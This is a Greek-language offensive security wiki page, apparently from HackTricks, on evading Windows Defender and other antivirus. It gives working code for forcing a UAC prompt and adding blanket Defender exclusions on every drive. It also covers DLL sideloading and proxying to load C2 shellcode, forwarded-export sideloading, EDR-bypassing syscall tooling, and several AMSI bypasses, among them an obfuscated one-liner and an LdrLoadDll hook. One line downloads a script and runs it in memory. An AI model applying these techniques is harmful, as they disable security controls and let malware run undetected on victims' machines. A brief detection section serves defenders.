# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα tool για τη διακοπή λειτουργίας του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα tool για τη διακοπή λειτουργίας του Windows Defender, προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### UAC bait τύπου installer πριν από την επέμβαση στον Defender

Οι public loaders που μεταμφιέζονται σε game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers, οι οποίοι πρώτα **ζητούν από τον χρήστη elevation** και μόνο έπειτα εξουδετερώνουν τον Defender. Η ροή είναι απλή:

1. Ελέγχει αν υπάρχει administrative context με το `net session`. Η εντολή ολοκληρώνεται με επιτυχία μόνο όταν ο caller έχει δικαιώματα admin, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως standard user.
2. Κάνει αμέσως relaunch του εαυτού του με το verb `RunAs`, ώστε να ενεργοποιήσει το αναμενόμενο UAC consent prompt, διατηρώντας παράλληλα την αρχική command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν “cracked” software, επομένως η προτροπή συνήθως γίνεται αποδεκτή, παρέχοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την policy του Defender.<sup>[[26]](#references)</sup>

### Blanket `MpPreference` exclusions για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσουν elevated δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα blind spots του Defender αντί να απενεργοποιήσουν εξ ολοκλήρου την υπηρεσία. Ο loader αρχικά τερματίζει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες exclusions**, ώστε κάθε user profile, system directory και removable disk να μην μπορεί να σαρωθεί:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Βασικές παρατηρήσεις:

- Ο βρόχος διασχίζει κάθε προσαρτημένο filesystem (D:\, E:\, USB sticks κ.λπ.), επομένως **οποιοδήποτε μελλοντικό payload τοποθετηθεί οπουδήποτε στον δίσκο αγνοείται**.
- Η εξαίρεση της επέκτασης `.sys` είναι προνοητική—οι attackers διατηρούν την επιλογή να φορτώσουν unsigned drivers αργότερα, χωρίς να χρειαστεί να αγγίξουν ξανά το Defender.
- Όλες οι αλλαγές καταλήγουν στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε μεταγενέστερα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Επειδή καμία υπηρεσία του Defender δεν σταματά, οι επιφανειακοί έλεγχοι υγείας συνεχίζουν να αναφέρουν “antivirus active”, παρόλο που η real-time επιθεώρηση δεν αγγίζει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία AV Evasion**

Προς το παρόν, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι malicious ή όχι: static detection, dynamic analysis και, για τα πιο προηγμένα EDR, behavioural analysis.

### **Στατική ανίχνευση**

Η static detection επιτυγχάνεται με τον εντοπισμό γνωστών malicious strings ή arrays από bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, digital signatures, icon, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να έχει ως αποτέλεσμα να εντοπιστείτε ευκολότερα, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως malicious. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτού του είδους την ανίχνευση:

- **Encryption**

Αν κάνετε encrypt το binary, δεν θα υπάρχει τρόπος για το AV να ανιχνεύσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το κάνετε decrypt και να το εκτελέσετε στη μνήμη.

- **Obfuscation**

Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε ορισμένα strings στο binary ή το script σας ώστε να περάσει από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας tools, δεν θα υπάρχουν γνωστά bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος ελέγχου απέναντι στη static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλαπλά segments και στη συνέχεια ζητά από το Defender να σαρώσει κάθε ένα ξεχωριστά. Με αυτόν τον τρόπο, μπορεί να σας δείξει ακριβώς ποια strings ή bytes έχουν επισημανθεί στο binary σας.

Συνιστώ ανεπιφύλακτα να δείτε αυτή την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το practical AV Evasion.

### **Dynamic analysis**

Η dynamic analysis είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για malicious activity (π.χ. προσπάθεια decrypt και ανάγνωσης των passwords του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά ακολουθούν μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Sleep before execution** Ανάλογα με τον τρόπο υλοποίησης, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης της dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία, ώστε να μην interrompάρουν τη ροή εργασίας του χρήστη, επομένως η χρήση μεγάλων sleeps μπορεί να παρεμποδίσει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παρακάμψουν το sleep, ανάλογα με τον τρόπο υλοποίησής του.
- **Checking machine's resources** Συνήθως τα Sandboxes διαθέτουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία του CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου το workstation είναι συνδεδεμένο στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν αντιστοιχεί σε αυτό που έχετε καθορίσει. Αν δεν αντιστοιχεί, μπορείτε να κάνετε το πρόγραμμά σας να τερματιστεί.

Αποδεικνύεται ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH. Επομένως, μπορείτε να ελέγξετε το computer name στο malware σας πριν από το detonation. Αν το όνομα είναι HAL9TH, αυτό σημαίνει ότι βρίσκεστε μέσα στο defender's sandbox, οπότε μπορείτε να κάνετε το πρόγραμμά σας να τερματιστεί.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> channel #malware-dev</p></figcaption></figure>

Όπως έχουμε αναφέρει και προηγουμένως σε αυτό το post, τα **public tools** τελικά **θα ανιχνευτούν**, επομένως θα πρέπει να κάνετε στον εαυτό σας μια ερώτηση:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό project που είναι λιγότερο γνωστό και κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα η δεύτερη. Αν πάρουμε το mimikatz ως παράδειγμα, είναι πιθανώς ένα από τα, αν όχι το πιο επισημασμένο malware από τα AV και EDR. Παρόλο που το ίδιο το project είναι εξαιρετικό, αποτελεί επίσης εφιάλτη στη χρήση όταν προσπαθείτε να παρακάμψετε τα AV, επομένως απλώς αναζητήστε alternatives για αυτό που προσπαθείτε να επιτύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε το automatic sample submission** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΚΑΝΕΤΕ UPLOAD ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να επιτύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας ανιχνεύεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε το automatic sample submission και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, να **δίνετε πάντα προτεραιότητα στη χρήση DLLs για evasion**. Από την εμπειρία μου, τα DLL files συνήθως **ανιχνεύονται και αναλύονται σε πολύ μικρότερο βαθμό**, επομένως αυτό είναι ένα πολύ απλό trick για την αποφυγή detection σε ορισμένες περιπτώσεις (αν το payload σας μπορεί με κάποιον τρόπο να εκτελεστεί ως DLL, φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά tricks που μπορείτε να χρησιμοποιήσετε με DLL files ώστε να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και τα malicious payload(s) το ένα δίπλα στο άλλο.

Μπορείτε να ελέγξετε για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και των αρχείων DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα DLL Hijackable/Sideloadable**, καθώς αυτή η τεχνική είναι αρκετά stealthy όταν υλοποιείται σωστά, αλλά αν χρησιμοποιήσετε δημοσίως γνωστά DLL Sideloadable προγράμματα, μπορεί να εντοπιστείτε εύκολα.

Η απλή τοποθέτηση ενός κακόβουλου DLL με το όνομα που αναμένει να φορτώσει ένα πρόγραμμα δεν θα φορτώσει το payload σας, επειδή το πρόγραμμα αναμένει συγκεκριμένες functions μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που πραγματοποιεί ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό DLL μετονομασμένο.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (encoded με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσεις το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και το [video του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθεις περισσότερα και σε μεγαλύτερο βάθος σχετικά με όσα συζητήσαμε.

### Abusing Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να κάνουν export functions που είναι στην πραγματικότητα "forwarders": αντί να δείχνει σε κώδικα, το export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller κάνει resolve το export, ο Windows loader θα:

- Κάνει load το `TargetDll`, αν δεν έχει ήδη φορτωθεί
- Κάνει resolve το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσεις:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική DLL search order, η οποία περιλαμβάνει τον κατάλογο του module που εκτελεί το forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρες ένα signed DLL που κάνει export μια function forwarded σε ένα non-KnownDLL module name και τοποθέτησε το συγκεκριμένο signed DLL μαζί με ένα attacker-controlled DLL που έχει ακριβώς το ίδιο όνομα με το forwarded target module. Όταν γίνει invoke το forwarded export, ο loader κάνει resolve το forward και φορτώνει το DLL σου από τον ίδιο κατάλογο, εκτελώντας το DllMain σου.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν φάκελο με δυνατότητα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε το forward με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Παρατηρούμενη συμπεριφορά:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα λάβετε σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές για hunting:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε τα forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το Windows 11 forwarder inventory για να αναζητήσετε candidates: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για Detection/defense:
- Παρακολουθήστε LOLBins (π.χ. `rundll32.exe`) που φορτώνουν signed DLLs από non-system paths και, στη συνέχεια, φορτώνουν non-KnownDLLs με το ίδιο base name από τον συγκεκριμένο κατάλογο
- Δημιουργήστε alert για process/module chains όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε user-writable paths
- Εφαρμόστε code integrity policies (WDAC/AppLocker) και απαγορεύστε write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα payload toolkit για bypassing EDRs με χρήση suspended processes, direct syscalls και alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού· αυτό που λειτουργεί σήμερα μπορεί να ανιχνεύεται αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο tool· αν είναι δυνατόν, δοκιμάστε να συνδυάζετε πολλαπλές τεχνικές evasion.

## Direct/Indirect Syscalls & Επίλυση SSN (SysWhispers4)

Τα EDRs συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές invocation:**
- **Direct (embedded)**: εισάγει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (χωρίς hit σε `ntdll` export).
- **Indirect**: κάνει jump σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε call.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· κάνει resolve μια syscall sequence κατά το runtime.

**Hook-resistant στρατηγικές επίλυσης SSN:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSNs ταξινομώντας τα syscall stubs με βάση τη virtual address αντί να διαβάζει τα stub bytes.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSNs από το `.text` του και στη συνέχεια κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει VA-sorted SSN inference με opcode validation όταν ένα stub είναι καθαρό· κάνει fallback σε VA inference αν είναι hooked.
- **HW Breakpoint**: θέτει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά το runtime, χωρίς parsing των hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για την αποτροπή του "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε, αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Η δυνατότητα AMSI είναι ενσωματωμένη στα εξής components των Windows.

- User Account Control ή UAC (ανύψωση δικαιωμάτων για εγκατάσταση EXE, COM, MSI ή ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενο των scripts σε μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη obfuscated.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη alert στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει στην αρχή το `amsi:` και στη συνέχεια το path προς το executable από το οποίο εκτελέστηκε το script, σε αυτή την περίπτωση το powershell.exe

Δεν αφήσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη εξαιτίας του AMSI.

Επιπλέον, από το **.NET 4.8** και μετά, ο κώδικας C# εκτελείται επίσης μέσω του AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για τη φόρτωση in-memory execution. Για αυτό, η χρήση χαμηλότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) συνιστάται για in-memory execution, αν θέλεις να παρακάμψεις το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Obfuscation**

Καθώς το AMSI βασίζεται κυρίως σε static detections, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι ένας καλός τρόπος αποφυγής του detection.

Ωστόσο, το AMSI έχει τη δυνατότητα να κάνει unobfuscate scripts ακόμη και αν έχουν πολλαπλά layers, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο υλοποίησής του. Αυτό καθιστά την αποφυγή detection όχι και τόσο απλή. Παρ' όλα αυτά, μερικές φορές το μόνο που χρειάζεται είναι να αλλάξεις μερικά variable names και θα είσαι εντάξει, επομένως εξαρτάται από το πόσο έντονα έχει γίνει flag κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να γίνει tamper με αυτό ακόμη και όταν εκτελείσαι ως unprivileged user. Εξαιτίας αυτού του ελαττώματος στην υλοποίηση του AMSI, οι researchers έχουν βρει πολλαπλούς τρόπους παράκαμψης του AMSI scanning.

**Forcing an Error**

Η εξαναγκασμένη αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινά κανένα scan για την τρέχουσα διεργασία. Αρχικά, αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε ένα signature για να αποτρέψει την ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη usable για την τρέχουσα διεργασία powershell. Αυτή η γραμμή έχει, φυσικά, εντοπιστεί από το ίδιο το AMSI, επομένως απαιτείται κάποια τροποποίηση για τη χρήση αυτής της τεχνικής.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση των δεδομένων εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με instructions που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή επεξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για την παράκαμψη του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Ένα robust, language‑agnostic bypass είναι η τοποθέτηση ενός user-mode hook στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν το ζητούμενο module είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται scans για τη συγκεκριμένη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders (οτιδήποτε διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε το με την τροφοδοσία scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για την αποφυγή μεγάλων command-line artefacts.
- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ. το `regsvr32` που καλεί το `DllRegisterServer`).

